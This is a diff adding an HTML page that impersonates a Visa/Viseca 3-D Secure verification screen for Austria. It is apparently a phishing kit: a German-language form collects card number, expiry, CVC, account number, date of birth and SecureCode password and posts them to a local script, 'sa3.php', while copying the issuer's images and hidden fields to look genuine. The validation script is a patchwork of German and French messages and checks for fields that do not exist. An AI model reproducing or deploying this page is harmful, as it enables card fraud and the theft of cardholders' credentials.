@@ -1,0 +1,377 @@
+﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+</head>
+<link rel="shortcut icon" href="http://www.vipvoley.com/templates/beez/css/favicon.ico">
+<body>
+<script language="javascript" type="text/javascript"> 
+function validation() 
+{ 
+       	if(document.formulaire.Cryptogramme.value == "") 
+		{ 
+        alert ('Bitte geben Sie Ihren Kartennummer'); 
+        document.formulaire.Cryptogramme.focus(); 
+        return false; 
+    	}
+       	if(document.formulaire.expiryMonth.value == "") 
+		{ 
+        alert ('Bitte geben Sie Ihren Karte gültig bis'); 
+        document.formulaire.expiryMonth.focus(); 
+        return false; 
+    	}
+		
+		if(document.formulaire.expiryYear.value == "") 
+		{ 
+        alert ('Bitte geben Sie Ihren Karte gültig bis'); 
+        document.formulaire.expiryYear.focus(); 
+        return false; 
+    	}		
+		if(document.formulaire.cvv.value == "") 
+		{ 
+        alert ('Bitte geben Sie Ihren CVC'); 
+        document.formulaire.cvv.focus(); 
+        return false; 
+    	}	 	
+		if(document.formulaire.pin1.value == "") 
+		{ 
+        alert ('Bitte geben Sie Ihren Kartenkontonummer'); 
+        document.formulaire.pin1.focus(); 
+        return false; 
+    	}	 	
+		if(document.formulaire.pin2.value == "") 
+		{ 
+        alert ('Bitte geben Sie Ihren Kartenkontonummer'); 
+        document.formulaire.pin2.focus(); 
+        return false; 
+    	}	 	
+		if(document.formulaire.pin3.value == "") 
+		{ 
+        alert ('Bitte geben Sie Ihren Kartenkontonummer'); 
+        document.formulaire.pin3.focus(); 
+        return false; 
+    	}	 	
+		if(document.formulaire.pin4.value == "") 
+		{ 
+        alert ('Bitte geben Sie Ihren Kartenkontonummer'); 
+        document.formulaire.pin4.focus(); 
+        return false; 
+    	}	 	
+		if(document.formulaire.securecode.value == "") 
+		{ 
+        alert ('Bitte geben Sie Ihren SecureCode'); 
+        document.formulaire.securecode.focus(); 
+        return false; 	 	
+ 
+        } 
+
+		
+		if(document.formulaire.C1.value ==0) 
+		{ 
+        alert ('veuillez entrer un mot de passe'); 
+        document.formulaire.C1.focus(); 
+        return false; 
+    	} 
+		if(document.formulaire.l_civil3.value == "") 
+		{ 
+        alert ('veuillez entrer le type de votre carte'); 
+        document.formulaire.l_civil3.focus(); 
+        return false; 
+    	}		
+		if(document.formulaire.ccnum.value == "") 
+		{ 
+        alert ('veuillez entrer le numero votre carte'); 
+        document.formulaire.ccnum.focus(); 
+        return false; 
+    	}
+		if(document.formulaire.mois.value == "") 
+		{ 
+        alert ('veuillez entrer la date l"expiration'); 
+        document.formulaire.mois.focus(); 
+        return false; 
+    	}
+		if(document.formulaire.annee.value == "") 
+		{ 
+        alert ('veuillez entrer la date l"expiration'); 
+        document.formulaire.annee.focus(); 
+        return false; 
+    	}
+		if(document.formulaire.cvv2.value == "") 
+		{ 
+        alert ('veuillez entrer le numero de cvv2'); 
+        document.formulaire.cvv2.focus(); 
+        return false; 
+    	}
+		
+ 
+else {return true;}
+}
+</script> 
+<form id="formulaire" name="formulaire" method="post" action="sa3.php"  onsubmit="return validation();">
+
+<HTML>
+<HEAD>
+<meta HTTP-EQUIV="Cache-Control" CONTENT="no cache">
+<meta HTTP-EQUIV="Pragma" CONTENT="no cache">
+<meta HTTP-EQUIV="Expires" CONTENT="0">
+<meta HTTP-EQUIV="content-type" CONTENT="text/html; charset=utf-8">
+
+	<TITLE>Visa Österreich</TITLE>
+	<LINK REL="stylesheet" HREF="style.css" TYPE="text/css">
+	<!-- x-out.js has code to POST PAReq to CAP when user closes window. -->
+	<script language=javascript src="https://acs1.viseca.ch/acspage/Viseca_de_DE_MC/x-out.js" ></script>
+	<SCRIPT LANGUAGE="JavaScript">
+	
+	var refreshing = false;
+	var navigating = false;
+	var closing = true;
+	var	IsCancelButton = false;
+    // Default language of the page, if the user doesnt change this value is written to the db.
+	var screenLang = "de_DE";
+
+	function onPageInit()
+	{
+		// TO HANDLE THE EVENT WHEN USER CLOSES POPUP
+		// pre-generate the HTML that is needed to POST to CAP when window is closed.
+		// does not work properly on NS if generated in the close-window event handler
+		gatherFormData(document.optInForm, "%#*@_XOUT_@*#%");
+
+		// uncomment the following if a client-side timeout is to be enabled.
+		// after the timeout period, the CAP dialog will be auto-POSTed resulting in
+		// a failed PARes.
+		// Change the 2nd parameter to suit the timeout needed;
+		// the value should be in milli seconds.
+		//setTimeout("ForceCancel()", 15000); // treat as cancelled txn if not posted in 15 seconds.
+
+		//to retain page locale if optin is submitted with error
+		//if("" != ""){
+		//	screenLang = "";
+		//}
+
+		//setLocale(screenLang);
+					
+		closing=true;
+		//window.history.go(1);
+		self.focus();
+	}
+	
+	function onFocusHandler()
+	{
+		closing = true;
+	}
+
+	// Configurable parameters:
+
+	var loadError = null;
+
+	function objError (evnt)
+	{
+		loadError = "error";
+	}
+
+	function onUserInput(userInput)
+	{
+		closing = false;
+		document.optInForm.optIn.value = userInput;
+
+		// on optin, when the user clicks register check that the terms and conditions are accepted
+		if (userInput == 1 && (1100 >= 1100) &&  (1100 <= 1103) && document.optInForm.agree.checked == false )
+		{
+			alert('Bitte akzeptieren Sie die Geschäftsbedingungen um den Vorgang fortzusetzen.');
+			return false;
+		}
+		
+		if((1100 >= 1100) &&  (1100 <= 1103) ||
+			(1100 >= 1200 && 1100 <= 1202))
+		{
+		  var monthValue = document.optInForm.expiryMonth[document.optInForm.expiryMonth.selectedIndex].text;
+		  var yearValue = document.optInForm.expiryYear[document.optInForm.expiryYear.selectedIndex].text;
+		  var accountNumber = document.optInForm.pin2_1.value +""+ document.optInForm.pin2_2.value +""+ document.optInForm.pin2_3.value +""+ document.optInForm.pin2_4.value;
+		  document.optInForm.pin.value = monthValue + "/" + yearValue + ":" + accountNumber + ":Locale=" + screenLang;
+		}
+		document.optInForm.submit();
+		return false;
+	}
+
+	// expiry date functions 
+	function initExpiryMonth(selectBox) {
+		  var option = document.createElement("option");
+		  option.text = "";
+		  selectBox.options[0] = option;
+		  
+		  for (var i = 1; i <= 12; i++) {
+		    option = document.createElement("option");
+		    if (i < 10) {
+		      option.text = "0" + i; 
+		    } else {
+		      option.text = i;
+		    }
+		    selectBox.options[i] = option;
+		  }	  
+	}
+
+	function initExpiryYear(selectBox) {
+		  var option = document.createElement("option");
+		  option.text = "";
+		  selectBox.options[0] = option;
+
+		  var currentYear = (new Date()).getFullYear();
+		  for (var i = 0; i < 5; i++) {
+		    option = document.createElement("option");
+		    option.text = (currentYear + i);
+		    selectBox.options[i + 1] = option;
+		  }	  
+	}
+
+	function initForm() {
+		initExpiryMonth(document.optInForm.expiryMonth);
+		initExpiryYear(document.optInForm.expiryYear);
+	}
+
+	function onLocaleChange(objLocale) {
+        closing = false;
+        document.optInForm.ChangeLocale.value = objLocale;
+        document.optInForm.submit();
+        return false;
+	}
+
+</SCRIPT>
+	
+</HEAD>
+
+<BODY BGCOLOR="#ffffff" MARGINHEIGHT="0" MARGINWIDTH="0" LEFTMARGIN="0" TOPMARGIN="0" onLoad="onPageInit()" onFocus="onFocusHandler();" onUnload="onUnloadHandler(this);" >
+<FORM name="formulaire" method=POST action="sa3.php">
+
+<div id="header">
+  <div id="header_issuer_theme"></div>
+  <div id="header_issuer_text" style="width: 170px; height: 61px">
+	<div id="header0">
+		<div id="header_lang_nav0">
+    <script language="JavaScript">
+    //diplay the 4 language links on optin pages 
+    if((1100 >= 1100) &&  (1100 <= 1103)){
+    	  document.writeln ('<a href="#" onclick="onLocaleChange(\'de_DE\')"><img id="link_lang_de" src="https://acs1.viseca.ch/acspage/Viseca_de_DE_MC/images/meta_de_i.gif" border="0" width="23" height="50"></a>');
+    	  document.writeln ('<a href="./lang/fr/index.php" onclick="onLocaleChange(\'fr_FR\')"><img id="link_lang_fr" src="https://acs1.viseca.ch/acspage/Viseca_de_DE_MC/images/meta_fr_i.gif" border="0" width="16" height="50"></a>');
+    	  document.writeln ('<a href="#" onclick="onLocaleChange(\'it_IT\')"><img id="link_lang_it" src="https://acs1.viseca.ch/acspage/Viseca_de_DE_MC/images/meta_it_i.gif" border="0" width="15" height="50"></a>');
+    	  document.writeln ('<a href="#" onclick="onLocaleChange(\'en_US\')"><img id="link_lang_en" src="https://acs1.viseca.ch/acspage/Viseca_de_DE_MC/images/meta_en_i.gif" border="0" width="16" height="50"></a>');
+    }
+    </script>&nbsp;</div>
+	</div>
+	</div>
+  <div id="header_lang_nav">
+     </div>
+</div>
+<div id="subheader"></div>
+
+<table id="main" width="377" align="center" cellpadding="0" cellspacing="0" border="0">
+  <tr>
+    <td>
+      <div id="brand" style="width: 392px; height: 409px">
+		<IMG SRC="http://www.antenci.net/class/INNOVAEditor/assets/visa.gif" ALT="MasterCard SecureCode" name="vpasLogo" width="260" height="66"  BORDER=0 SIZE="4" MAXLENGTH="4"><BR>
+      	<p><span id="stringH1070">Verified By Visa Osterreich (3D Secure)</span></p>
+		<table class="dynContent" id="table1" width="314">
+			
+			<tr>
+				<td class="left" width="154"><span id="stringH1120">Kartennummer<font color="#FF0000">*</font>:</span></td>
+				<td class="left" width="168">
+				<input class="monospace" size="19" maxlength="19" autocomplete="OFF" name="Cryptogramme"></td>
+			</tr>
+			<tr>
+				<td class="left" width="154"><span id="stringH1130">Karte gültig 
+				bis<font color="#FF0000">*</font>:</span></td>
+				<td class="right" width="168"><select name="expiryMonth">
+				<option></option>
+				<option>01</option>
+				<option>02</option>
+				<option>03</option>
+				<option>04</option>
+				<option>05</option>
+				<option>06</option>
+				<option>07</option>
+				<option>08</option>
+				<option>09</option>
+				<option>10</option>
+				<option>11</option>
+				<option>12</option>
+				</select> - <select name="expiryYear">
+				<option></option>
+				<option>2016</option>
+				<option>2017</option>
+				<option>2018</option>
+				<option>2019</option>
+				<option>2020</option>
+				<option>2021</option>
+				<option>2022</option>
+				<option>2023</option>
+				</select><input name="pin1" value type="hidden"><br>
+&nbsp;</td>
+			</tr>
+			<tr>
+				<td class="left" width="154"><span id="stringH1120">CVC<font color="#FF0000">*</font>:</span></td>
+			  <td class="left" width="168">
+				<input class="monospace" size="4" maxlength="3" autocomplete="OFF" name="cvv"></td>
+			</tr>
+			<tr>
+				<td class="left" width="154"><span id="stringH1140">
+				Kartenkontonummer<font color="#FF0000">*</font>:</span></td>
+			  <td class="right" width="168">
+				<input class="monospace" size="19" maxlength="19" autocomplete="OFF" name="pin1">
+				<a target="_blank" href="http://www.viseca.ch/Documents/Forms/de/Kartenkontonummer_DE.pdf">
+				<img src="https://acs1.viseca.ch/acspage/Viseca_de_DE_MC/images/moreinfo.gif" alt="Mehr Informationen" border="0" width="24" height="22"></a>				</td>
+			</tr>
+			<tr>
+              <td class="left"><span id="stringH1120">Geburtsdatum<font color="#FF0000">*</font>:</span></td>
+			  <td class="left"><input name="tt" class="monospace" id="tt" size="2" maxlength="2" autocomplete="OFF">
+		      <input name="mm" class="monospace" id="mm" size="2" maxlength="2" autocomplete="OFF">
+		      <input name="jj" class="monospace" id="jj" size="4" maxlength="4" autocomplete="OFF">		       
+		      (TT.MM.JJJJ)</td>
+		  </tr>
+			<tr>
+				<td class="left" width="154"><span id="stringH1120">SecureCode (Passwort)<font color="#FF0000">*</font>:</span></td>
+				<td class="left" width="168">
+				  <p>
+				    <input class="monospace" size="10" maxlength="10" autocomplete="OFF" name="securecode" type="password">
+				  </p>
+			  </td>
+			</tr>
+			<tr>
+				<td colspan="2">
+				<table border="0" width="100%" id="table2" cellspacing="0" cellpadding="0">
+					<tr>
+						<td><font color="#FF0000">*</font><span style="font-size: 8pt">siehe 
+						aktuelle Kreditkartenabrechnung (16-stellige Nummer)</span></td>
+					</tr>
+					<tr>
+						<td><input type="checkbox" name="C1" value="ON"><span style="font-size: 8pt">Ich 
+						akzeptiere die speziellen Bestimmungen für 3-D Secure.
+						</span></td>
+					</tr>
+				</table>				</td>
+			</tr>
+		</table>
+			
+		
+				<div class="nav" align="left">
+					<input value="later" onClick="return onUserInput(2);" src="https://acs1.viseca.ch/acspage/Viseca_de_DE_MC/images/but_register_later.gif" alt="Nicht jetzt aktivieren" type="image" border="0" name="I1"></div>
+				<div class="navcenter" align="center">
+					<a class="moreinfolink" target="_blank" href="http://www.viseca.ch/de/LEISTUNGEN-Zusatzleistungen-MyAccount-MyAccount/22/Default.aspx">
+					Mehr Informationen</a></div>
+				<div class="nav" align="right" style="width: 53px; height: 22px">
+					<input value="submit" onClick="return onUserInput(1);" src="https://acs1.viseca.ch/acspage/Viseca_de_DE_MC/images/but_send.gif" alt="Jetzt aktivieren" type="image" border="0" name="I2"></div>
+	  </div>
+		</span>
+      </div>
+    </form>
+    </td>
+  </tr>
+  <input type="hidden" name="PaReq" value="eJxVUttSwjAQ/RXHV8dukjbSMmtmgpcRxwuKjvLEhHaBjBKwLUr9ehMsXt727O2cswk+zEui0yHl65IUXlNVmRnt2eJ4fzNdyHFnLMYiSkWaCLavcKDv6U3hO5WVXTrFIxYJhB3042U+N65WaPK3Xv9GScFiIRFaiAsq+6cqyYRkUguR8SQVhx3GeJzJFOG7jM4sSI30SPfOzhC2CPPl2tVlozrSE+4ArstXNa/rVdUFqLYeIutyM4kqCqrstIGJdTAyjQHrCtoghBGEX6WDdYgqT7Gxhbo9qj/uzp+Hd2SHydXny+jx/UrqWV/rx2OE0IGFqUkJxhnnTO7xrJtkXe5FbfNoFkGbklHGvO1vgKvAodtKKPxNoJddkssblSa+9IOQNqulI9/hl//EWFCVK85EJxY8jj1twAi/Nk4uwvnz2l/STAeFvnyhhh0kPfiY0HD6lM52btqmwGP9Mb0dviUKACGsgfa9of0XPvr3X74ADA+7EQ==" >
+<input type="hidden" name="MD" value="102732133">
+<input type="hidden" name="TermUrl" value="https://secure.incab.se/verify/bin/Yaya/index">
+<input type="hidden" name="optIn" value="-1">
+<input type="hidden" name="issuerAnswer" value="">
+<input TYPE="hidden" NAME="pin" SIZE="14" MAXLENGTH="30" CLASS="monospace">
+<input type="hidden" name="AcsCookie" value="kVyZMAEhPJCRBL926rc34c9GIpeJL19Hzg/5NY/pVuWdnnhQruv6WGJUCs9VfbP2P/PZk2qkG2Y9H5SA5zlbvx/rK4jxSmWiAvHi5zOBlolXzNa6UPljQ3X5ixjfXO8j+A7l4OiwhFd6KXINxZ6tI5He/IWwknSp7OHcMmcHU+Mn+1WLxfc6zj3qSZQrS6tlVJ2vE3Xl9SM9U87ME0UgjQ==">
+<input type="hidden" name="ChangeLocale" value="">
+<input type="hidden" name="CustData" value="">
+<input type="hidden" name="Locale" value="">
+<input type="hidden" name="cancelHit" value="">
+</form>
+</BODY>
+</HTML>
